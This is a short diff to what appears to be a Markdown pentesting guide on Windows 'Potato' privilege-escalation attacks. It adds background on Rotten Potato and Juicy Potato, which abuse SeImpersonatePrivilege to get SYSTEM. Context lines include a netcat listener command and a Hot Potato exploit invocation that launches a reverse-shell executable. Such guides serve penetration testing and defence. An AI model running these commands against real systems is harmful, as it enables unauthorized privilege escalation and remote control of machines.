@@ -1084,7 +1084,7 @@ The term "Hot Potato" refers to an attack that combines a spoofing assault with 
 nc -lvnp <PORT>
 ```
 
-3. Run the exploit:
+3. Run the potato exploit:
 
 ```text
 .\potato.exe -ip 192.168.10.10 -cmd "C:\Users\Public\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
@@ -1093,6 +1093,16 @@ nc -lvnp <PORT>
 4. Wait for a Windows Defender update, or trigger one manually
 
 ## Juicy Potato
+
+### Rotten Potato
+
+In 2016, the original Rotten Potato flaw was discovered. A SYSTEM ticket could be intercepted by a service account and used to impersonate the SYSTEM user. Because service accounts typically have the “SeImpersonatePrivilege” ability enabled, this was conceivable.
+
+### Juicy Potato
+
+The exploit Rotten Potato was relatively restricted. Juicy Potato works in the same manner that Rotten Potato does, but the authors performed a lot of research and came up with a lot of new ways to use it.
+
+{% embed url="https://github.com/ohpe/juicy-potato" %}
 
 We can execute JuicyPotato with the following example:
 
